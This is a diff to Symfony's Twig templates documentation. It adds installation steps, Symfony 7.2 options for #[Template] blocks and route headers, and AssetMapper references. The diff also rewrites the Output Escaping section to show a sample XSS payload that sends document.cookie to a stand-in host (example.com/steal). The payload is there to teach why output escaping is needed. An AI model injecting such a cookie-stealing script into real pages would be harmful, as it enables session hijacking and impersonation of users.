@@ -6,6 +6,16 @@ whether you need to render HTML from a :doc:`controller </controller>` or genera
 the :doc:`contents of an email </mailer>`. Templates in Symfony are created with
 Twig: a flexible, fast, and secure template engine.
 
+Installation
+------------
+
+In applications using :ref:`Symfony Flex <symfony-flex>`, run the following command
+to install both Twig language support and its integration with Symfony applications:
+
+.. code-block:: terminal
+
+    $ composer require symfony/twig-bundle
+
 .. _twig-language:
 
 Twig Templating Language
@@ -192,7 +202,7 @@ Consider the following routing configuration:
 
         // ...
         use Symfony\Component\HttpFoundation\Response;
-        use Symfony\Component\Routing\Annotation\Route;
+        use Symfony\Component\Routing\Attribute\Route;
 
         class BlogController extends AbstractController
         {
@@ -329,8 +339,8 @@ as follows:
 Build, Versioning & More Advanced CSS, JavaScript and Image Handling
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-For help building, versioning and minifying your JavaScript and
-CSS assets in a modern way, read about :doc:`Symfony's Webpack Encore </frontend>`.
+For help building and versioning your JavaScript and
+CSS assets in a modern way, read about :doc:`Symfony's AssetMapper </frontend>`.
 
 .. _twig-app-variable:
 
@@ -566,7 +576,7 @@ use the ``render()`` method of the ``twig`` service.
 
 .. _templates-template-attribute:
 
-Another option is to use the ``#[Template()]`` attribute on the controller method
+Another option is to use the ``#[Template]`` attribute on the controller method
 to define the template to render::
 
     // src/Controller/ProductController.php
@@ -583,7 +593,7 @@ to define the template to render::
         {
             // ...
 
-            // when using the #[Template()] attribute, you only need to return
+            // when using the #[Template] attribute, you only need to return
             // an array with the parameters to pass to the template (the attribute
             // is the one which will create and return the Response object).
             return [
@@ -631,6 +641,31 @@ methods::
 This might come handy when dealing with blocks in
 :ref:`templates inheritance <template_inheritance-layouts>` or when using
 `Turbo Streams`_.
+
+Similarly, you can use the ``#[Template]`` attribute on the controller to specify
+a block to render::
+
+    // src/Controller/ProductController.php
+    namespace App\Controller;
+
+    use Symfony\Bridge\Twig\Attribute\Template;
+    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+    use Symfony\Component\HttpFoundation\Response;
+
+    class ProductController extends AbstractController
+    {
+        #[Template('product.html.twig', block: 'price_block')]
+        public function price(): array
+        {
+            return [
+                // ...
+            ];
+        }
+    }
+
+.. versionadded:: 7.2
+
+    The ``#[Template]`` attribute's ``block`` argument was introduced in Symfony 7.2.
 
 Rendering a Template in Services
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -705,6 +740,11 @@ provided by Symfony:
                     site_name: 'ACME'
                     theme: 'dark'
 
+                # optionally you can define HTTP headers to add to the response
+                headers:
+                    Content-Type: 'text/html'
+                    foo: 'bar'
+
     .. code-block:: xml
 
         <!-- config/routes.xml -->
@@ -733,6 +773,11 @@ provided by Symfony:
                 <default key="context">
                     <default key="site_name">ACME</default>
                     <default key="theme">dark</default>
+                </default>
+
+                <!-- optionally you can define HTTP headers to add to the response -->
+                <default key="headers">
+                    <default key="Content-Type">text/html</default>
                 </default>
             </route>
         </routes>
@@ -764,10 +809,19 @@ provided by Symfony:
                     'context' => [
                         'site_name' => 'ACME',
                         'theme' => 'dark',
+                        ],
+
+                    // optionally you can define HTTP headers to add to the response
+                    'headers' => [
+                        'Content-Type' => 'text/html',
                     ]
                 ])
             ;
         };
+
+.. versionadded:: 7.2
+
+    The ``headers`` option was introduced in Symfony 7.2.
 
 Checking if a Template Exists
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -1060,7 +1114,7 @@ template fragments. Configure that special URL in the ``fragments`` option:
             $framework->fragments()->path('/_fragment');
         };
 
-.. caution::
+.. warning::
 
     Embedding controllers requires making requests to those controllers and
     rendering some templates as result. This can have a significant impact on
@@ -1077,7 +1131,7 @@ JavaScript library.
 
 First, include the `hinclude.js`_ library in your page
 :ref:`linking to it <templates-link-to-assets>` from the template or adding it
-to your application JavaScript :doc:`using Webpack Encore </frontend>`.
+to your application JavaScript :doc:`using AssetMapper </frontend>`.
 
 As the embedded content comes from another page (or controller for that matter),
 Symfony uses a version of the standard ``render()`` function to configure
@@ -1266,14 +1320,14 @@ different templates to create the final contents. This inheritance mechanism
 boosts your productivity because each template includes only its unique contents
 and leaves the repeated contents and HTML structure to some parent templates.
 
-.. caution::
+.. warning::
 
     When using ``extends``, a child template is forbidden to define template
     parts outside of a block. The following code throws a ``SyntaxError``:
 
     .. code-block:: html+twig
 
-        {# app/Resources/views/blog/index.html.twig #}
+        {# templates/blog/index.html.twig #}
         {% extends 'base.html.twig' %}
 
         {# the line below is not captured by a "block" tag #}
@@ -1285,17 +1339,25 @@ and leaves the repeated contents and HTML structure to some parent templates.
 Read the `Twig template inheritance`_ docs to learn more about how to reuse
 parent block contents when overriding templates and other advanced features.
 
-Output Escaping
----------------
+.. _output-escaping:
+.. _xss-attacks:
+
+Output Escaping and XSS Attacks
+-------------------------------
 
 Imagine that your template includes the ``Hello {{ name }}`` code to display the
-user name. If a malicious user sets ``<script>alert('hello!')</script>`` as
-their name and you output that value unchanged, the application will display a
-JavaScript popup window.
+user name and a malicious user sets the following as their name:
 
-This is known as a `Cross-Site Scripting`_ (XSS) attack. And while the previous
-example seems harmless, the attacker could write more advanced JavaScript code
-to perform malicious actions.
+.. code-block:: html
+
+    My Name
+    <script type="text/javascript">
+        document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
+    </script>
+
+You'll see ``My Name`` on screen but the attacker just secretly stole your cookies
+so they can impersonate you on other websites. This is known as a `Cross-Site Scripting`_
+or XSS attack.
 
 To prevent this attack, use *"output escaping"* to transform the characters
 which have special meaning (e.g. replace ``<`` by the ``&lt;`` HTML entity).
@@ -1452,7 +1514,7 @@ templates under an automatic namespace created after the bundle name.
 
 For example, the templates of a bundle called ``AcmeBlogBundle`` are available
 under the ``AcmeBlog`` namespace. If this bundle includes the template
-``<your-project>/vendor/acme/blog-bundle/Resources/views/user/profile.html.twig``,
+``<your-project>/vendor/acme/blog-bundle/templates/user/profile.html.twig``,
 you can refer to it as ``@AcmeBlog/user/profile.html.twig``.
 
 .. tip::
@@ -1467,7 +1529,7 @@ Writing a Twig Extension
 
 `Twig Extensions`_ allow the creation of custom functions, filters, and more to use
 in your Twig templates. Before writing your own Twig extension, check if
-the filter/function that you need is already implemented in:
+the filter/function that you need is not already implemented in:
 
 * The `default Twig filters and functions`_;
 * The :doc:`Twig filters and functions added by Symfony </reference/twig_reference>`;
@@ -1639,7 +1701,7 @@ for this class and :doc:`tag your service </service_container/tags>` with ``twig
 .. _`snake case`: https://en.wikipedia.org/wiki/Snake_case
 .. _`tags`: https://twig.symfony.com/doc/3.x/tags/index.html
 .. _`Twig block tag`: https://twig.symfony.com/doc/3.x/tags/block.html
-.. _`Twig Environment`: https://github.com/twigphp/Twig/blob/3.x/src/Loader/FilesystemLoader.php
+.. _`Twig Environment`: https://github.com/twigphp/Twig/blob/3.x/src/Environment.php
 .. _`Twig Extensions`: https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension
 .. _`Twig output escaping docs`: https://twig.symfony.com/doc/3.x/api.html#escaper-extension
 .. _`Twig raw filter`: https://twig.symfony.com/doc/3.x/filters/raw.html
